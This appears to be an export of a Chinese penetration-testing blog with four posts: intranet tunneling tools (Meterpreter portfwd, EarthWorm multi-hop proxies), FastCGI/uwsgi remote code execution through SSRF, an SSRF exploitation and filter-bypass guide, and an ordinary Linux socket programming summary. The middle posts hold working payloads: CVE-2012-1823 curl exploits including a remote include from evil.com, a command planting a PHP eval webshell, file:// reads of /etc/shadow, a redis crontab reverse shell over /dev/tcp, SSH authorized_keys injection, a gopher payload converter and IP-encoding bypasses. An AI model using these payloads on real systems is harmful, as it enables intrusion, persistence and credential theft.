portfwd在MSF渗透框架里面内置了端口转发的命令，在回弹了shell的条件下可以直接使用，下面式相关参数解析。12345678910111213141516171819meterpreter &gt; portfwd -hUsage: portfwd [-h] [add | delete | list | flush] [args]OPTIONS: -L &lt;opt&gt; 转发: 本地监听地址 反向: 本地主机连接到某个地址 -R 表示正向反向端口 -h 帮助信息 -i &lt;opt&gt; 端口转发条目的索引与交互（请参阅“列表”命令） -l &lt;opt&gt; 转发：本地端口收听 反向：本地端口连接 -p &lt;opt&gt; 转发：远程端口连接 反向：远程端口监听 -r &lt;opt&gt; 转发：连接到远程主机 例子:portfwd -L 127.0.0.1 -l 1212 -r 10.10.12.1 -p 3389 portfwd -R -L 10.10.18.1 -l 8080 -r 10.10.12.1 -p 8877 Rinetd12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758# 安装，注意到centos没有其默认的软件源，需要手动导入；ubuntu的比较方便#centos 32$ vim /etc/yum.repos.d/nux-misc.repo[nux-misc]name=Nux Miscbaseurl=http://li.nux.ro/download/nux/misc/el6/i386/enabled=0gpgcheck=1gpgkey=http://li.nux.ro/download/nux/RPM-GPG-KEY-nux.ro#centos 64$ vim /etc/yum.repos.d/nux-misc.repo:[nux-misc]name=Nux Miscbaseurl=http://li.nux.ro/download/nux/misc/el6/x86_64/enabled=0gpgcheck=1gpgkey=http://li.nux.ro/download/nux/RPM-GPG-KEY-nux.ro$ yum --enablerepo=nux-misc install rinetd# ubuntu$ apt-get install rinetd#配置文件在/etc/rinetd.conf，配置参数格式[bindaddress] [bindport] [connectaddress] [connectport]绑定的地址 绑定的端口 连接的地址 连接的端口[Source Address] [Source Port] [Destination Address] [Destination Port]源地址 源端口 目的地址 目的端口#举例$ vim /etc/rinetd.conf0.0.0.0 8080 172.19.94.3 80800.0.0.0 2222 192.168.0.103 33891.2.3.4 80 192.168.0.10 80allow *.*.*.*logfile /var/log/rinetd.log#解释0.0.0.0表示本机绑定所有可用地址将所有发往本机8080端口的请求转发到172.19.94.3的8080端口将所有发往本机2222端口的请求转发到192.168.0.103的3389端口将所有发往1.2.3.4的80端口请求转发到192.168.0.10的80端口allow设置允许访问的ip地址信息,*.*.*.*表示所有IP地址logfil设置打印的log的位置# 运行#脚本启动$ /etc/init.d/rinetd start#二进制启动$ /usr/sbin/rinetd -c /etc/rinetd.conf#关闭（使用脚本，或则和pkill）$ /etc/init.d/rinetd stop Tunna 与 reGeorg 这两个工具的使用都是比较简单，就不啰嗦了，在获取webshell后，我们可以通过http进行端口转发。直接给出两个项目地址，推荐使用reGeorg，Tunna不稳定。Tunna工具地址 reGeorg工具地址。 Localtunnel与Gnork这两个工具都可以将内网的端口映射到公网，然后访问公网的ip就类似于访问内网的端口。这两个工具可以提供自建服务或者使用它提供的服务器进行内网穿透。其实这类工具在实际渗透中不是很常用。更直接的场景是自己攻击机在内网，在进行相关回连操作的时候，需要目标机器可达，毕竟它们只是一级转发，而且操作麻烦。直接给出项目地址： https://github.com/localtunnel/localtunnel https://ngrok.com/ EW 工具的地址： http://rootkiter.com/EarthWorm/ 这是个国产的打洞神器，因为其方便的多级转发，支持反向代理等特性，在内网渗透领域可是响当当的。这里重点对这个工具做下记录，真的太强大了！ 该工具共有 6 种命令格式（ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran）。下面针对官方的例子进行以下解释： 正向代理1$ ./ew -s ssocksd -l 1080 开启机器的1080端口做正向代理，我们可以通过链接该机器的1080端口进行端口代理转发。一般的场景为：kali 通过proxychain 链接开启了正向代理的公网ip。 反响代理12345#公网ip主机A，ip假设为1.1.1.1./ew -s rcsocks -l 1080 -e 8888 # 目标机B./ew -s rssocks -d 1.1.1.1 -e 8888 反向代理是目标机向我们发起链接请求，与正向代理是不一样的。当建立了链接后，它的代理流如下Me&lt;---&gt;A&lt;---&gt;B。即我只要连接A的1080端口就可以获得一条反向代理的隧道，与B建立连接。这种场景可以用来绕过入口策略严格但是出口策略松散的防火墙。 多级转发在前面的两个场景中，我们看到了rcsocks,`ssocksd,rssocks这三个命令的使用。在多级转发中我们会见到另外三个命令的作用。他们就类似于中间件，负责隧道导流与串接。 1234567#命令使用举例：# lcx_listen 用在将本机的端口进行转发$ ./ew -s lcx_listen -l 1080 -e 8888# lcx_tran 将本机端口与目的ip地址的端口进行转发$ ./ew -s lcx_tran -l 1080 -f 2.2.2.3 -g 9999# lcx_slave 作为奴隶，将本机直接可达的两个主机实体上的端口进行转发$ ./ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 2.2.2.3 -g 9999 下面我们来看个实际渗透三级级联例子：1234567891011# 我们自己的VPS执行$ ./ew -s rcsocks -l 1080 -e 8888# 跳板机A执行$ ./ew -s lcx_slave -d ip_A -e 8888 -f ip_B -g 9999# 跳板机B执行$ ./ew -s lcx_listen -l 9999 -e 7777# 跳板机C执行$ ./ew -s rssocks -d ip_B -e 7777 数据流向: SOCKS v5 -&gt; 1080 -&gt; 8888 -&gt; 9999 -&gt; 7777 -&gt; rssocks。我们来解读以下这个三级级联，首先这是个反向代理的例子，反向代理的目的端口是C的7777，当隧道建立完成，我们只需要连接到VPS的1080端口，就会自动帮我们转发到7777。我们来看下中间过程如何：首先第一个命令VPS在8888接收反向代理，并且在1080等候我们的连接。第二条命令将跳板机A的8888端口导向9999；第三行命令将跳板机B的9999端口导向7777；最后第四条命令在跳板机上进行反向代理发起连接到跳板机B的7777端口。 FRPfrp也提供了完善的内网穿透的功能，功能上其实和gnork这些差不多，但是相比起来，FRP的配置更为灵活。推荐层度：FRP&gt;Localtunnel&gt;gnork 中文官方文档 过墙隧道前面介绍的端口转发，有使用http协议，tcp协议，sockts代理的，但是这些协议转发流量太过于碍眼，容易被严谨的防火墙规则过滤，导致shell从内网出不来，那么在这种情况下，我们就需要强有力的过墙隧道。下面是笔者在网上搜罗的一些走udp的dns隧道和走icmp的隧道，可以说这两种打洞手段很别出心裁，笔者看得是叹为观止。这里先把相关的工具链接和看过的文章记录下来。写不动了……，避免篇幅过长（其实是有点懒），下次补上。 DNS2tcphttps://pkgs.org/download/dns2tcp http://pwdme.cc/2016/11/11/dns2tcp-dns-tunnel/ https://www.freebuf.com/articles/system/8726.html https://kali.tuisec.win/kalitools/dns2tcp_zh.html https://www.aldeid.com/wiki/Dns2tcp iodinehttps://github.com/yarrick/iodine https://www.freebuf.com/articles/system/178214.html https://blog.csdn.net/weixin_36440115/article/details/76400359 icmpshhttps://github.com/inquisb/icmpsh 参考文献Powershell攻击指南黑客后渗透之道系列——基础篇Powershell攻击指南黑客后渗透之道系列——进阶利用Powershell攻击指南黑客后渗透之道系列——实战篇内网渗透常见端口转发方式玩转SSH端口转发内网安全检查/渗透总结推荐一款很好用的内网穿透工具—FRPLocaltunnel内网穿透工具的安装与使用CentOS下部署Ngrok服务器]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>绕过</tag>
        <tag>渗透</tag>
        <tag>内网</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[FastCGI RCE in SSRF]]></title>
    <url>%2F2018%2F12%2F20%2FFastCGI-RCE-in-SSRF%2F</url>
    <content type="text"><![CDATA[在学习ssrf利用的时候，发现不少文章或者议题种提到了fastcgi的远程命令执行。所以本着学习的思路打算去看下相关的内容，参考链接是笔者认为对这一攻击形式讲解还不错的一些菊苣写的文章，特别是p神的深入解读，很值得一看。另外也找到了一些自动化利用的脚本，在参考链接[5]已经给出。这篇文章就当是自己对cgi,fastcgi,php-fpm,uwsgi这些名词的进一步理解。 概述理解这个漏洞利用方式的一个前提是fastcgi暴露在了公网，当然不排除运维人员粗心大意的情况；但是更多的利用场景还是类似ssrf这样。在服务端开启gopher协议的情况下，我们可以直接通过fastcgi进行命令执行。 cve-2012-1823下面是网上流传的cve-2012-1823 的poc,细节可以查看参考文献[4]，由于这两个payload具有一定的历史，限制条件比较多，必须限于两个php版本之间，至于为啥是限于两个版本之间，看了p神文章就会明白这里有段开发趣闻。就不展开了，这里仅仅把poc搜集在下面：12345# 本地包含代码执行curl -H &quot;USER-AGENT: &lt;?system(&apos;id&apos;);die();?&gt;&quot; http://target.com/test.php?-dauto_prepend_file%3d/proc/self/environ+-n # 远程包含代码执行curl http://target.com/test.php?-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3a%2f%2Fwww.evil.com%2fevil.txt fastcgi与wsgi一直比较好奇fastcgi是个啥，着两天也是看了不少文章，然后结合自己的理解，才把这个概念弄明白。如果对通用网关接口（cgi）了解的话，就不难理解为fastcgi就是cgi的进阶版本。提供了更有效率的接口模式和进程管理，在ubuntu上可以sudo apt install php-fpm安装这个模块支持，否则默认的是PHP-CGI。1234CGI：是 Web Server 与 Web Application 之间数据交换的一种协议。FastCGI：同 CGI，是一种通信协议，但比 CGI 在效率上做了一些优化。同样，SCGI 协议与 FastCGI 类似。PHP-CGI：是 PHP （Web Application）对 Web Server 提供的 CGI 协议的接口程序。PHP-FPM：是 PHP（Web Application）对 Web Server 提供的 FastCGI 协议的接口程序，额外还提供了相对智能一些任务管理。 上面是针对php的fastcgi来说的，其实在python里面也有网关接口协议,现在可以知道fastcgi与wsgi很多程度上说的是协议，而php-fpm与php-cgi则可以理解为协议的具体实现。同样的在python里面有个实现了wsgi协议的服务器uWSGI，其内置协议就取名为uwsgi，其实是对wsgi的实现和拓展。所以某种层度上说，python里的uwsgi和php里的php-fpm地位十分相似。体现在他们都可以作为nginx 服务应用的接口，提供对python和php的脚本解析支持。 说了这么多，那么我们为什么需要这些协议？ 可想而知，apache和nginx都是c语言写的程序，而很多服务器解析脚本是php，perl,python等，两个进程交互总得定义一下规范吧，所以这些协议就应运而生。那么为什么服务器不直接在一个语言里面实现呢？实现当然没问题！用过django的伙伴就有体会，其实django内置了一个小型服务器，实现了wsgi协议规范，但是我们实际部署的时候，往往不直接用它它内置的服务器裸奔在公网，而是弄个nginx服务器，然后nginx负责直接的与浏览器交互。试想，我们有了apache，nginx这样高性能且稳定的可以处理高并发的服务器，那就让他们在前面处理请求好了，把接受的请求信息通过协议规范发给后台解析进程管理器，让进程管理器从进程池中启动一个进程并调用相应的脚本解释器。这样分工明确又能够发挥各自的优势，何乐不为？ 漏洞利用上面说了一堆的背景知识。我们现在言归正传。php-fpm和uwsgi都是默认监听在本地的某个端口，等待前面服务器（是apache或者nginx）解析请求的到来。正因为它无条件的监听在本地某个端口，只要我们可以构造满足协议规范的请求包，就可以执行任意命令。而通过ssrf，利用gopher协议我们可以很轻松的让本地监听的php-fpm和uwsgi为我们所用。至于如何构造满足协议的包，p神写了一片很细很细的文章(参考链接[3]),当然还有自动化生成满足这些协议payload的工具。 下面以python uwsgi为例，概念验证可以调用gopher协议写入webshell（有写入权限的情况下，本实验已经chmod 777 理想化过网站根目录，实际中需要找到上传目录），（网上已经有很多利用php fastcgi的demo，除此以外还可以直接弹shell,这里就展示了）123nc -lvp 4444&gt;payload.txtpython uwsgi_exp.py -u 127.0.0.1:4444 -c &quot;echo &apos;&lt;?php @eval($_POST[value]);?&gt;&apos; &gt;/var/www/html/webshell.php&quot; 使用脚本转换成gopher协议：123456789import urllib.request def genpayload(): f = open(&quot;payload.txt&quot;,&quot;br&quot;) content = f.read() print (urllib.request.quote(content)) if __name__ == &quot;__main__&quot;: genpayload() 下载uwsgi 并且运行uwsgi，模拟服务器中uwsgi运行，监听端口8001 123pip install uwsgiuwsgi --socket :8001 参考[1] PHP FastCGI RCE Vul[2] PHP基础之fastcgi协议[3] Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写[4] PHP-CGI advisory (CVE-2012-1823)[5] webcgi exploits[6] Fastcgi php-fpm 漏洞利用方式]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ssrf</tag>
        <tag>绕过</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSRF突破边界]]></title>
    <url>%2F2018%2F12%2F19%2Fssrf%E5%B0%8F%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[ssrf是17年的owasp top 10新宠，因攻击方可以利用服务端去访问策略相对宽松的内网环境，使得很多边界得以被突破，攻击者侵入内网,翻江倒海。一直以来都没有对ssrf进行全方位的了解，最近看了一些会议的议题pdf以及相关菊苣的文章后决定总结一下。 图片来自：Nop.pw 0x01 漏洞点 CRLF file_get_contents()/readfile() fsockopen() curl_exec() XXE cURL,LWP,java uri …… 12345678910111. 从WEB功能上寻找 通过URL分享内容 文件处理、编码处理、转码等服务 在线翻译 通过URL地址加载与下载图片 图片、文章的收藏 设置邮件接收服务器 2. 从URL关键字寻找 share、wap、url、link、src、source、target、u、3g、 display、sourceURl、imageURL、domain... 0x02 攻击流程12341. 确定ssrf类型：socket直连式，curl lib库调用式......2. 信息搜集：扫秒本机或者内网开放的主机，及其端口，对照wiki 词条（[List_of_TCP_and_UDP_port_numbers）可以知晓端口运行的服务3. fuzz允许的协议类型，探测过滤规则，bypass......4. pwn!!! 0x03 use protocol 图片来自Bible cheatsheet file协议的文件读取1234?u=file:///etc/passwd?u=file:/etc/shadow?u=file:///etc/apache2/sites-available/*...... 当file协议没有过滤的时候，我们可以通过file协议读取敏感文件（权限允许的范围内），包括系统配置，服务器配置，源码…… dict协议信息收集扫端口以及获取服务信息1234dict://serverip:port/info?url=dict://127.0.0.1:6379/keys%20 # 获取redis的键值?url=dict://127.0.0.1:6379/info # 获取redis相关信息...... dict+redis=getshell1234dict://serverip:port/name:data例如：dict://serverip:port/config:set:dir:/var/spool/cron/ #config set dir /var/spool/cron/ \r\n gopher获取shell要知道，如果我们发现了ssrf，然后再内网找到了一台未授权访问的redis服务，那么整个大门就会为我们敞开。进一步的渗透工作就成了从redis反弹shell的简单问题。之前有写过一篇redis未授权访问相关文章，也开源了docker 镜像，可以很方便的练手。这里摘录下两个常见getshell思路，也算是对上次的回顾。 crontab定时任务弹shell payload1234567redis-cli -h 127.0.0.1set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.63.128/7999 0&gt;&amp;1\n&quot; #设置定时任务载体键值# 设置数据库存储路径（权限运行的情况下）config set dir /var/spool/cron/# 设置文件名为root 即root用户的定时任务config set dbfilename root save 谈到定时任务这个地方，需要科普一下linux下的定时任务相关操作。围绕linux下的定时任务涉及两个命令：cron，crontab。cron是随主机启动的守护进程，其监视的定时任务文件夹或文件如下（按优先级次序）1231. /var/spool/cron/crontabs/ #这个文件夹下文件以用户名命名，每个文件对应一个用户的定时任务表，一般通过crontab -e 进行编写2. /etc/crontab #这个目录一般是系统级别的定时任务，其定义了四个part: /etc/cron.hourly，/etc/cron.daily,/etc/cron.weekly,/etc/cron.monthly 所以一般情况下，我们都不直接对crontab进行操作，而是再对应的四个part 部分定义 时，天，周，月层次上的cron任务3. /etc/cron.d/ # 一般不再这个文件夹下进行操作 另外，还需要注意，/etc/cron.deny,/etc/cron.allow两个文件限制了哪些用户不能够进行定时任务，这在渗透中很致命，所以得引起关注。 ssh 公钥注入payload1234567891011#公钥转储到foo.txt(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; foo.txt #将文件转化为键值cat foo.txt | redis-cli -h 127.0.0.1 -x set crackit#设置数据库存储目录（需要redis root用户运行，或者降权将设置为redis运行用户目录）config set dir /root/.ssh/config get dirconfig set dbfilename &quot;authorized_keys&quot;save 上面是直接与redis 交互下的反弹shell 操作，在 ssrf中利用dict或者gopher协议也可以直接达到这种效果，下面主要介绍gopher协议下的利用方式：gopher协议是http协议他爹，所以很多协议都对其做了向前兼容，所以，虽然gopher协议已经是历史，但是在渗透的时候还是会发挥很大的作用。当然要利用这个协议，就需要按照协议的规范，也就是说我们需要本地抓包对payload 进行协议转换，使其符合gopher 协议格式就可以利用。 这里推荐一款自动化payload 生成工具：https://github.com/tarunkant/Gopherus 诚然，我们也可以利用wireshark，tcpdump，socat……等工具进行抓包，强烈推荐socat，因为大师傅留下的转化脚本，可以省去协议转化的麻烦，脚本待会奉上。 socat -v tcp-listen:4444,fork tcp-connect:localhost:6379 对本地4444 端口进行转发到6379，并接听4444端口的流量 12345678910111213141516171819202122232425import sysexp = &apos;&apos;with open(sys.argv[1]) as f: for line in f.readlines(): if line[0] in &apos;&gt;&lt;+&apos;: continue # 判断倒数第2、3字符串是否为\r elif line[-3:-1] == r&apos;\r&apos;: # 如果该行只有\r，将\r替换成%0a%0d%0a if len(line) == 3: exp = exp + &apos;%0a%0d%0a&apos; else: line = line.replace(r&apos;\r&apos;, &apos;%0d%0a&apos;) # 去掉最后的换行符 line = line.replace(&apos;\n&apos;, &apos;&apos;) exp = exp + line # 判断是否是空行，空行替换为%0a elif line == &apos;\x0a&apos;: exp = exp + &apos;%0a&apos; else: line = line.replace(&apos;\n&apos;, &apos;&apos;) exp = exp + lineprint(exp) http协议访问裸奔restful接口 例子：CouchDB restful api ，参考链接[9] ldap1ldap://hostname:port/%0a%0dcommand%0a%0dcommand ……0x04 bypass relevancecommon 以下内容摘录自参考链接[5] Bypass using HTTPS123https://127.0.0.1/https://localhost/Bypass localhost with [::] Bypass localhost12345678http://[::]:80/http://[::]:25/ SMTPhttp://[::]:22/ SSHhttp://[::]:3128/ Squidhttp://0000::1:80/http://0000::1:25/ SMTPhttp://0000::1:22/ SSHhttp://0000::1:3128/ Squid Bypass with nip.io1NIP.IO maps &lt;anything&gt;.&lt;IP Address&gt;.nip.io to the corresponding &lt;IP Address&gt;, even 127.0.0.1.nip.io maps to 127.0.0.1 Bypass with 302123&lt;?phpheader(&apos;Location: xxx://xxx.xxxx.xxx/xxx&apos;);?&gt; Bypass with @ Bypass using a decimal ip location1234http://0177.0.0.1/http://2130706433/ = http://127.0.0.1http://3232235521/ = http://192.168.0.1http://3232235777/ = http://192.168.1.1 Bypass using enclosed alphanumerics123http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ Bypass with Alternate IP encoding12345678http://425.510.425.510/ Dotted decimal with overflowhttp://2852039166/ Dotless decimalhttp://7147006462/ Dotless decimal with overflowhttp://0xA9.0xFE.0xA9.0xFE/ Dotted hexadecimalhttp://0xA9FEA9FE/ Dotless hexadecimalhttp://0x41414141A9FEA9FE/ Dotless hexadecimal with overflowhttp://0251.0376.0251.0376/ Dotted octalhttp://0251.00376.000251.0000376/ Dotted octal with padding php fsockopen() cheatsheep php readfile() and parse_url() 图片来自 参考链接[7] Abusing_URL_Parsers 图片来自 参考链接[7] DNS pinning 与 DNS rebinding这是另一种比较高端的绕过ip限制的方式。我们试想这样一种场景，存在ssrf可利用的服务器对内网ip进行了十分严密的过滤，我们找不到直接的绕过思路。那么这个时候就可以利用DNS来大作文章。大致的实现思路有两种： DNS pinning：引导服务器访问一个域名，这个域名的解析权在我们可控的DNS服务器上，那么我们可以将这个域名地址指定为一个内网地址，那么就饿可以绕过对ip的正则。 DNS rebinding：抓住验证和curl的两个事务间的时间间隔,让我们的域名服务器第一次域名查询反回不触犯过滤规则的ip，第二次域名查询反回内网ip。就可以绕过。需要注意的是必须要避免DNS缓存，如设置ttl=0。 有个自动化的DNS rebinding框架可以使用： https://github.com/mwrlabs/dref。更多相关细节移步另一篇文章：DNS relevance。 参考文献[1] https://damit5.com/2018/05/26/SSRF-%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/[2] https://joychou.org/web/phpssrf.html#[3] http://brieflyx.me/2015/linux-tools/socat-introduction/[4] http://docs.ioin.in/writeup/fuzz.wuyun.org/_src_build_your_ssrf_exp_autowork_pdf/index.pdf[5] https://github.com/cujanovic/SSRF-Testing[6] https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF%20injection[7] us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf[8] http://www.zerokeeper.com/web-security/ssrf-learning-notes.html[9] D2T2-YuHong-Attack Surface Extended by URL Schemes.pdf]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ssrf</tag>
        <tag>绕过</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux socket 编程模型总结]]></title>
    <url>%2F2018%2F12%2F11%2FLinux-socket-%E7%BC%96%E7%A8%8B%E6%A8%A1%E5%9E%8B%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[socket编程作为互联网间进程通信手段之一，是必须掌握的一项基本技能。也值备考之余，打算好好梳理以下socket编程在实际使用中的模型。从协议上分，socket编程可以分为TCP或者UDP socket；从IO方式上分有阻断式和非阻断式；从处理逻辑结构上分可以有循环式和并发式两种。不同的分类下又对应着具体的实现模型，这些实现相当灵活，不同分类之间没有实现上的间隙，很多应用场景中是交织的。所以要想学好socket编程，除了掌握基本的函数API，还应该对这些分类以及实现模型有个认知。这也是作者写下这篇梳理文章的动机。 阻塞IO模型由于网络传输是有延迟的，每个socket的收发都相当于一次次IO操作。在阻塞式IO模式中，程序会在涉及socket操作的一系列函数上进行阻塞。直到相关socket事务处理完后才继续程序逻辑。这是默认的socket策略，也即如果我们不自定义设置socket参数，默认会执行IO阻塞式操作。那么也许有人会问，一个进程在进行IO阻塞的时候一直暂用cpu，岂不是会影响其他进程的运行？答案式否定的。这个问题涉及到了linux系统进程调度的问题，虽然对理解这个IO阻塞没有很大联系。但是可以加深下对操作系统的理解。在linux系统中，存在有时间片的机制。避免IO密集型的进程在进行大量IO操作的时候独占cpu资源，所以会根据时间片来对进程进行运行时切换。这样可以很大的提高系统cpu的使用率。好了大致解释了以下IO密集性的基本概念，我们来看下哪些函数操作在默认socket参数下是会造成IO阻塞的。涉及IO阻塞的函数如下：1234产生阻塞的函数—读操作：read、readv、recv、recvfrom和recvmsg产生阻塞的函数—写操作：write、writev、send、sendto和sendmsg产生阻塞的函数—建立连接：connect产生阻塞的函数—TCP接受连接：accept 可以看到，只要涉及网络传输的函数就会存在阻塞。阻塞在socket编程中是个中性词，与非阻塞相比，没有好换优略之分，主要看业务需求。以下是阻塞式IO的特点： 结构简单，易同步； 进程可能永远阻塞或阻塞时间过长； 阻塞时进程效率低 由于系统对IO密集型进程的调度作用，不会长时间占用CPU（时间片机制） 使用阻塞模式的套接字，开发网络程序比较简单，容易实现。当希望能够立即发送和接收数据，且处理的套接字数量比较少的情况下，使用阻塞模式来开发网络程序比较合适。套接字相关函数默认时采用阻塞方式操作，而大多数情况下，程序不仅仅只拥有一个套接字。当进程以阻塞方式操作其中之一时，必将导致不能使用其他的套接字。如果希望这些套接字同时工作，就必须设计并发的套接字程序，即在一个套接字读写的同时保证另一个套接字也能正常地操作。设计并发的方法有循环里，创建子进程或者使用子线程处理每个recive的socket_fd,这样就会使得阻塞只在单个线程或者单个进程内发生。下面将会介绍这种模型。 并发创建子进程模型/创建子线程模型这种模型的出现，其实是为了解决阻塞式IO下，程序并行效率底下的问题。通过对每一个处理请求使用多进程或多线程的处理机制，可以将阻塞效应限制在单个进程或线程内，带来很好的并发体验。并发创建子进程模型/创建子线程模型伪代码流程如下（注意到为了突出功能，省略了一些错误处理）：1234567891011121314151617181920//初始化socketfdinit_socket();//bind bind(...);//listenlisten(...);//循环 acceptwhile(1)&#123; newsocket=accept(......); if(newsocket)&#123; if(fork()==0)&#123; //子进程处理逻辑 close(socketfd) dosomething(); exit(0); &#125; &#125; //父进程关闭当轮循环newsocket close(newsocket) &#125; 延迟创建子进程模型之前我们看到的并发创建子进程模型，其在实现上仍旧有可以改进的地方。首先创建子进程的开销非常的大，如果一个很小的处理业务我们都为其创建一个单独进程，无疑是个不明智的选择，所以我们希望简单业务直接主进程循环内部解决，这就是延迟创建子进程模型；同样的，如果当有链接建立请求到来后再创建子进程无疑会影响用户体验，所以我们希望可以预先创建好子进程，这就是下一节要说的预创建子进程。在延迟创建子进程模型中，我们需要一个评判机制，对来自客户端的业务复杂程度进行判断，考虑是是否需要创建子进程。1234567891011121314151617181920212223242526//初始化socketfdinit_socket();//bind bind(...);//listenlisten(...);//循环 acceptwhile(1)&#123; newsocket=accept(......); if(newsocket)&#123; if(predictor())&#123;//预测器判断是否需要进行创建子进程，如果需要就进行创建子进程操作 if(fork()==0)&#123; //子进程处理逻辑 close(socketfd) dosomething(); exit(0); &#125; &#125; else&#123; process_in_while()//如果判定不需要创建子进程，则将处理逻辑放在while循环内 &#125; &#125; //父进程关闭当轮循环newsocket close(newsocket) &#125;...... 预创建子进程模型所谓的预创建子进程，其模型存在的意义就是为了解决用户请求时创建子进程时的进程创建开销。其具有如下特点： 所有子进程调用accept，无连接时将睡眠；有连接到来时子进程被唤醒；某一个子进程接受连接后，其他进程继续睡眠。 响应速度快，节省创建子进程时间。 当然根据预创建的子进程数量是否固定，又可以分为固定预创建子进程模型和动态创建子进程模型。在固定创建子进程模型中，我们需要预先估计好可能会到来的客户端链接数量，预创建子进程数量少时将导致客户端等待，预创建子进程数量多时将浪费系统资源。但是在动态创建模型中就没有这一限制。 固定模型其具体的流程如下：12345678910111213141516171819202122232425262728//初始化socketfdinit_socket();//关键步骤，设置socket地址复用int n=1;setsockopt(socketfd,SOL_SOCKET,SO_REUSEADDR,&amp;n,sizeof(n));//bind bind(...);//listenlisten(...);//循环创建指定数量的子进程for(int i=0;i&lt;MAXPROCESS;i++)&#123; if(pid[i]=fork()==0)&#123; //在每个子进程中采用循环socket模式进行accept操作 while(1)&#123; connfd=accept(); do_something(); close(connfd); &#125; &#125;&#125;......//退出时清除回收所有子进程for(int i=0;i&lt;MAXPROCESS;i++)&#123; if(pid[i]&gt;0)kill(pid[i],SIGTERM); &#125;while(wait(NULL)&gt;0)&#123;&#125; 动态模型的大体流程如下：12345服务器建立socket，并创建一定数量子进程服务器父进程维护所有子进程的状态表，父进程和子进程通过管道通信子进程接受连接时给父进程发1，关闭连接时发0父进程收到1时检查空闲子进程数目是否小于下限，小于下限则创建新的子进程父进程收到0时检查空闲子进程数目是否大于上限，大于上限则终止一些子进程 select 高并发web服务器模型12345678910111213141516171819202122232425int select(int nfds, fd_set* readfds, fd_set* writefds, fd_set* execptfds, struct timeval* timmeout); nfds: 监控的文件描述符集里最大文件描述符加1, 因为此参数会告诉内核横测前多少个文件描述符的状态 readfds: 监控有读数据到达文件描述符集合, 传入传出参数 writefds: 监控写数据到达文件描述符集合, 传入传出参数 execptfds:监控异常发生达文件描述符集合, 如带外数据到达异常, timeout: 设置阻塞监控时间,3种情况 1. NULL 永远等下去 2. 设置timeval, 等待固定的时间 3. 设置timeval里时间均为0, 检查描述字后立即返回, 轮询void FD_ZERO(fd_set* set); //把文件描述符集合里初始化为0void FD_SET(int fd, fd_set* set); //把文件描述符集合里fd位置1void FD_CLR(int fd, fd_set* set); //把文件描述符集合里fd位置0int FD_ISSET(int fd, fd_set* set); //测试文件描述符集合里fd是否为1 有返回1, 没有返回0 非阻塞IO模型对比阻塞式IO模型，在很多方面是要比非阻塞IO在性能上带来很大的提高。当然其同步问题也是需要注意，而且可能让编程逻辑变得相当复杂的一个点。对比阻塞式IO模型，- 非阻塞式IO有以下特点： 不会产生阻塞； 输入方式效率比较高； 长时间占用CPU，属于CPU密集型进程； 通设置套接字的参数，我们可以将默认的阻塞IO变成非阻塞IO：12345678函数fcntl，设置O_NONBLOCK选项int flags;flags=fcntl(sockfd,F_GETFL,0);fcntl(sockfd, F_SETFL, flags|O_NONBLOCK);函数ioctl，设置FIONBIO选项int on=1;ioctl(sockfd, FIONBIO, &amp;on); 信号驱动IO模型信号驱动IO，当有数据到达的时候，系统内核发出SIGIO，通过自定义的信号处理函数对这个信号进行相关处理。其程序流程大致如下：12345678910111213141516//定义SIGIO信号处理函数void sigio_handle(int sig)&#123; send_or_recv_something() ......&#125;//注册信号处理函数struct sigaction act;act.sa_handler=sigio_handler;act.sa_flags=0;sigaction(SIGIO,&amp;act,NULL);//设置套接字所有者为当前进程fcntl(sockfd,F_SETOWN,getpid());//设置信号驱动模式int i=1;ioctl(sockfd,FIOASYNC,&amp;i);....... 